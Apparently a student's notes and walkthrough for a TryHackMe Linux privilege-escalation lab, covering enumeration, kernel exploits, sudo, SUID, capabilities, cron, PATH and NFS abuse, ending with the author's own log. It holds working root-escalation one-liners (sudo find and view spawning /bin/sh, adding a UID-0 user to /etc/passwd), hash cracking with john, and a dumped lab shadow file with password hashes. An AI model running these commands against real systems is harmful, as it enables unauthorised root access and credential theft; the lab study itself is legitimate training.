# Introduction

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access.

## Enumeration 
Some files to check out are
* `/proc/version`
* `/etc/issue`
* `/etc/passwd`
* 
Some commands to check out are
* `hostnmame`
* `uname -a`
* `ps aux`
* `env`
* `sudo -l`
* `id`
* `history`
* `ifconfig` and `ip route`
* `netstat`

### Finding files and folders
- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size

- `find / -writable -type d 2>/dev/null` : Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders

### Automated enumeration tools
Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)


## Privilege escalation using kernel exploits
Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.
Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.
The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

The Kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

**Research sources:**  

1. Based on your findings, you can use Google to search for an existing exploit code.
2. Sources such as [https://www.cvedetails.com/](https://www.cvedetails.com/) can also be useful.
3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

**Hints/Notes:**

1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.

## sudo privesc
* Using the application functions to exploit 
* Leverage `LD_PRELOAD` [blog](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) 
	* `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
	* `sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

## SUID privsec
`find / -type f -perm -04000 -ls 2>/dev/null`


## Using capabilities
Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  
The capabilities man page provides detailed information on its usage and options.

using `getcap` as it displays the name and capabilities of each specified file.
using some flags and redirecting the errors to /dev/null, we get the shell via GTFObins

## Using cronjobs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.  
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

The script will use the tools available on the target system to launch a reverse shell on some cronjob file.  
Two points to note;

1. The command syntax will vary depending on the available tools. (e.g. `nc` will probably not support the `-e` option you may have seen used in other cases)
2. We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.

In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.

## Using PATH
If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “`export PATH=/tmp:$PATH`” command accomplishes this.

## Using NFS
Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.  
  
Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.  
  
NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.  


## 🖥️ Overview

This room walks through **Linux privilege escalation techniques** using an intentionally vulnerable Debian/Ubuntu VM. It covers enumeration, targeted kernel exploits, SUID binaries, sudo abuse, capabilities, cron jobs, PATH weaknesses, and NFS misconfigurations—all grounded in realistic attack paths ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).

---

## 1. Environment Setup & Initial Access

- **Deploy the VM** in-browser or via OpenVPN.
    
- **SSH into the box** as user `karen` with password `Password1` (Task 3 enumeration user) ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"), [Medium](https://medium.com/%40kerimkerimov213/tryhackme-linux-privilege-escalation-7e8251caeee5?utm_source=chatgpt.com "TryHackMe:Linux Privilege Escalation(linprivesc) - Medium")).
    
- Confirm user identity:
    
    ```bash
    id
    # uid=1000(karen) ...
    ```
    

---

## 2. Task 3: Enumeration

Run the following to gather system baseline:

- `hostname` → machine name (e.g. `wade7363`)
    
- `uname -a` or `cat /proc/version` → Kernel version (e.g. `3.13.0-24-generic`)
    
- `cat /etc/issue` → OS (e.g. Ubuntu 14.04 LTS)
    
- `python --version` → version (e.g. Python 2.7.6)
    
- Google kernel version to identify CVE (→ **CVE‑2015‑1328**) ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"))
    

These answers correspond to the Task 3 questions.

---

## 3. Task 4: Automated Enumeration Tools

Optional: run tools like **LinEnum**, **linPEAS**, **LES**, **linux-smart-enumeration**, **linuxprivchecker** to speed up enumeration ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).

---

## 4. Task 5: Kernel Exploits (Vertical Privilege Escalation)

### 🧪 Steps:

1. Identify actual kernel version.
    
2. Locate relevant exploit (e.g., overlayfs exploit for CVE‑2015‑1328).
    
3. Download exploit to `/tmp` via `wget` or `scp`.
    
4. Compile (`gcc exploit.c -o exploit`) and run.
    
5. Validate root shell: `whoami`, `id`.
    

This gives you root; view **flag1.txt** (e.g. `THM-28392872729920`) ([Medium](https://medium.com/%40NoOne./linux-privilege-escalation-tryhackme-part-1-f0ae442e6864?utm_source=chatgpt.com "Linux Privilege Escalation | TryHackMe — Part 1 | by Asim Anwar"), [Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"), [Medium](https://medium.com/%40kerimkerimov213/tryhackme-linux-privilege-escalation-7e8251caeee5?utm_source=chatgpt.com "TryHackMe:Linux Privilege Escalation(linprivesc) - Medium"), [InfoSec Write-ups](https://infosecwriteups.com/linux-privesc-tryhackme-writeup-bf4e32460ee5?utm_source=chatgpt.com "Linux PrivEsc Tryhackme Writeup - InfoSec Write-ups")).

---

## 5. Task 6: Sudo Enumeration & Abuse (Karen user)

- Run `sudo -l` to list allowed commands (e.g. `find`, `less`, `nano`).
    
- Use **GTFOBins** for exploitation:
    
    - `find` can be used to spawn a shell:
        
        ```bash
        sudo find . -exec /bin/sh \; -quit
        ```
        
    - `nano`, `less`, etc. have exploit options.
        
- Use root shell to read `/etc/shadow` and find **Frank’s password hash** ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
    

Answer the Task 6 questions:

- **Number of sudo programs** (e.g. 3)
    
- **Flag2 contents**
    
- **Frank’s hash** ([Source Code](https://blog.davidvarghese.dev/posts/tryhackme-linux-privesc/?utm_source=chatgpt.com "TryHackMe: Linux PrivEsc | Source Code - David Varghese"), [Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"))
    

---

## 6. Task 7: SUID-Based Escalation

### 🔎 Enumeration:

- Run `find / -type f -perm -04000 -ls 2>/dev/null` to list all SUID binaries.
    
- Identify exploitable binaries (e.g. `nano`, `base64`) ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
    

### 🚀 Exploitation Paths:

#### A) Shadow Dump + Cracking

- Use SUID binary (e.g. `nano`) to read `/etc/shadow`, `/etc/passwd`.
    
- Base64-encode if using tools like `base64`:
    
    ```bash
    /usr/bin/base64 /etc/shadow > shadow.b64
    base64 -d shadow.b64 > shadow.txt
    ```
    
- Combine with `passwd` copy and use `unshadow`:
    
    ```bash
    unshadow passwd.txt shadow.txt > hashes.txt
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    ```
    
- Extract user2 password, then `su user2` → access **flag3.txt** ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"), [Medium](https://medium.com/%40kerimkerimov213/tryhackme-linux-privilege-escalation-7e8251caeee5?utm_source=chatgpt.com "TryHackMe:Linux Privilege Escalation(linprivesc) - Medium")).
    

#### B) Adding a New Root User

- On attacker, generate a salted hash:
    
    ```bash
    openssl passwd -1 'NewPass'
    ```
    
- Using SUID editor, append to `/etc/passwd`:
    
    ```
    eviluser:<hash>:0:0::/root:/bin/bash
    ```
    
- `su eviluser` → root access.
    

### ✅ Task 7 Questions:

- **User named after comic-book writer** (e.g. `gerryconway`)
    
- **User2’s password** cracked
    
- **flag3.txt** content ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas"), [Medium](https://medium.com/%40kerimkerimov213/tryhackme-linux-privilege-escalation-7e8251caeee5?utm_source=chatgpt.com "TryHackMe:Linux Privilege Escalation(linprivesc) - Medium"))
    

---

## 7. Task 8: Linux File Capabilities

- Enumerate with:
    
    ```bash
    getcap -r / 2>/dev/null
    ```
    
- Look for binaries like `view`, `vim` with `cap_setuid` or `cap_setgid`.
    
- Leverage GTFOBins to spawn a shell:
    
    ```bash
    ./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'
    ```
    
- Access **flag4.txt** as root ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
    

---

## 8. Task 9: Cron Job Abuse

- Review system crontab:
    
    ```bash
    cat /etc/crontab
    ```
    
- Identify root-owned jobs calling writable scripts.
    
- Modify script to include reverse shell payload.
    
- Receive shell listener → root access.
    
- Grab **flag5.txt**, and find user credentials (Matt’s password) from environment or script logs.
    

---

## 9. Task 10: $PATH Hijacking

- Identify writable folders in PATH (e.g. `~/bin`, or `~/scripts`).
    
- Place malicious binary/script named like a common executable.
    
- Trigger root process that calls it due to PATH order.
    
- Once executed under root, read **flag6.txt** ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
    

---

## 10. Task 11: NFS Root Squashing

- Review `/etc/exports`.
    
- Locate any shares with `no_root_squash`.
    
- From attacker, mount the share.
    
- Plant binary owned by root or escalate via directories.
    
- Spawn a root shell locally; read **flag7.txt** ([Jasper Alblas](https://www.jalblas.com/blog/thm-linux-privilege-escalation-walkthrough/?utm_source=chatgpt.com "TryHackMe: Linux Privilege Escalation - Walkthrough - Jasper Alblas")).
    

---

## 11. Task 12: Capstone / Full Challenge

- Combines multiple techniques above.
    
- Start as normal user, enumerate all vectors, escalate to root using SUID, cron, NFS, sudo, capabilities etc.
    
- Collect all flags in order.
    

---

## 📌 Lab Reference Checklist

|Section|Commands & Tools|
|---|---|
|Enumeration|`hostname`, `uname -a`, `cat /etc/issue`, `python --version`, `find`, `sudo -l`, `getcap`, `crontab`, `exports`|
|Kernel Exploit|`gcc exploit.c`, `./exploit`|
|SUDO Abuse|`sudo find`, `sudo nano`, `sudo less`|
|SUID Abuse|`find / -perm -04000`, `nano /etc/shadow`, `unshadow`, `john`|
|Capabilities|`getcap`, exploitation via GTFOBins tools|
|Cron Abuse|Modify root-owned scripts|
|PATH abuse|Write malicious binary and await execution|
|NFS Abuse|`mount`, exploit `no_root_squash`, gain root|

---

## 🎯 Key Takeaways & Methodology

1. Always start with **comprehensive enumeration**.
    
2. Use vulnerability databases (GTFOBins, Exploit‑DB) to map binaries and kernel versions.
    
3. Evaluate **both stealth (cracking)** and **direct modification (adding root users)** techniques.
    
4. Exploit **SUID, capabilities, sudo**, and **filesystem misconfigurations** thoroughly.
    
5. Maintain separate sessions or exit root between techniques to avoid interference.
    
6. Build muscle memory: replicate on local labs like DVWA Juice Shop or LoFi-Labs for practice.
    

---

Feel free to bookmark this documentation and revisit whenever you're exploring privilege escalation paths—each vector carries invaluable skill practice 🧠. Want to build an automated lab script or CTF template based on this? I can spin one up.

# Final privesc

Did some digging on the shadow and passwd file
root:x:0:0:root:/root:/bin/bash                                                                                                                               
bin:x:1:1:bin:/bin:/sbin/nologin                                                                                                                              
daemon:x:2:2:daemon:/sbin:/sbin/nologin                                                                                                                       
adm:x:3:4:adm:/var/adm:/sbin/nologin                                                                                                                          
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin                                                                                                                      
sync:x:5:0:sync:/sbin:/bin/sync                                                                                                                               
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown                                                                                                                  
halt:x:7:0:halt:/sbin:/sbin/halt                                                                                                                              
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
colord:x:998:995:User for colord:/var/lib/colord:/sbin/nologin
unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
libstoragemgmt:x:996:993:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
saslauth:x:995:76:Saslauthd user:/run/saslauthd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
gluster:x:994:992:GlusterFS daemons:/run/gluster:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin 
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
setroubleshoot:x:993:990::/var/lib/setroubleshoot:/sbin/nologin
rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
radvd:x:75:75:radvd user:/:/sbin/nologin
chrony:x:992:987::/var/lib/chrony:/sbin/nologin
saned:x:991:986:SANE scanner daemon user:/usr/share/sane:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
sssd:x:990:984:User for sssd:/:/sbin/nologin
usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
geoclue:x:989:983:User for geoclue:/var/lib/geoclue:/sbin/nologin
gdm:x:42:42::/var/lib/gdm:/sbin/nologin 
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
pcp:x:987:981:Performance Co-Pilot:/var/lib/pcp:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
oprofile:x:16:16:Special user account to be used by OProfile:/var/lib/oprofile:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
missy:x:1001:1001::/home/missy:/bin/bash


Some shadow files
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::                                 
bin:*:18353:0:99999:7:::                                                                                                                                      
daemon:*:18353:0:99999:7:::                                                                                                                                   
adm:*:18353:0:99999:7:::                                                                                                                                      
lp:*:18353:0:99999:7:::                                                                                                                                       
sync:*:18353:0:99999:7:::                                                                                                                                     
shutdown:*:18353:0:99999:7:::                                                                                                                                 
halt:*:18353:0:99999:7:::                                                                                                                                     
mail:*:18353:0:99999:7:::                                                                                                                                     
operator:*:18353:0:99999:7:::                                                                                                                                 
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
pegasus:!!:18785::::::
systemd-network:!!:18785::::::
dbus:!!:18785::::::
polkitd:!!:18785::::::
colord:!!:18785::::::
unbound:!!:18785::::::
libstoragemgmt:!!:18785::::::
saslauth:!!:18785::::::
rpc:!!:18785:0:99999:7:::
gluster:!!:18785::::::
abrt:!!:18785::::::
postfix:!!:18785::::::
setroubleshoot:!!:18785::::::
rtkit:!!:18785::::::
pulse:!!:18785::::::
radvd:!!:18785::::::
chrony:!!:18785::::::
saned:!!:18785::::::
apache:!!:18785::::::
qemu:!!:18785::::::
ntp:!!:18785::::::
tss:!!:18785::::::
sssd:!!:18785::::::
usbmuxd:!!:18785::::::
geoclue:!!:18785::::::
gdm:!!:18785::::::
rpcuser:!!:18785::::::
nfsnobody:!!:18785::::::
gnome-initial-setup:!!:18785::::::
pcp:!!:18785::::::
sshd:!!:18785::::::
avahi:!!:18785::::::
oprofile:!!:18785::::::
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
[leonard@ip-10-10-61-54 ~]$ ^C


Then I used unshadow on my device and made a file `final`

then i used the rockyou to find the passwd

then I found out a username and passwd

then I ssh'd to it and found the flag1 file

then I knew that I could use find so i did `sudo find . -exec /bin/sh \; -quit`
then priv esc was done 
and i found the flag2